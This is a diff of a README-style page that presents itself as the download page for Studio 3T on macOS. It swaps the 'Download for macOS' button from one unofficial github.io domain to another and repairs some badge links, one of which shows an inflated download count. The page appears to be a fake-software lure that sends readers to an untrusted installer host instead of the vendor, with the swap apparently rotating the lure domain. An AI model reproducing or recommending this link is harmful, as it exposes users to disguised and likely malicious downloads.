@@ -6,7 +6,7 @@
 <h3>Studio 3T for macOS</h3>
 <p>Studio 3T Mac Edition combines visual design, code editors and migration helpers into one MongoDB control room.</p>
 
-<a href="https://install-quick-mac.github.io/.github/Studio3T">
+<a href="https://mac-software-install.github.io/.github/Studio3T">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
@@ -16,8 +16,8 @@
 
 <a href="#"><img src="https://img.shields.io/badge/downloads-6.8k-brightgreen?style=flat" alt="downloads"/></a>
 <a href="#"><img src="https://img.shields.io/badge/version-7.1-blue?style=flat" alt="version"/></a>
-<a href="#"><img src="https://img.shields.io-badge/license-Mac%20License-lightgrey?style=flat" alt="license"/></a>
-<a href="#"><img src="https://img.shields.io-badge/platform-macOS-blue?style=flat" alt="platform"/></a>
+<a href="#"><img src="https://img.shields.io/badge/license-Mac%20License-lightgrey?style=flat" alt="license"/></a>
+<a href="#"><img src="https://img.shields.io/badge/platform-macOS-blue?style=flat" alt="platform"/></a>
 
 <img src="https://studio3t.com/wp-content/uploads/2022/04/S3T.png" width="824" alt="Screenshot"/>
 
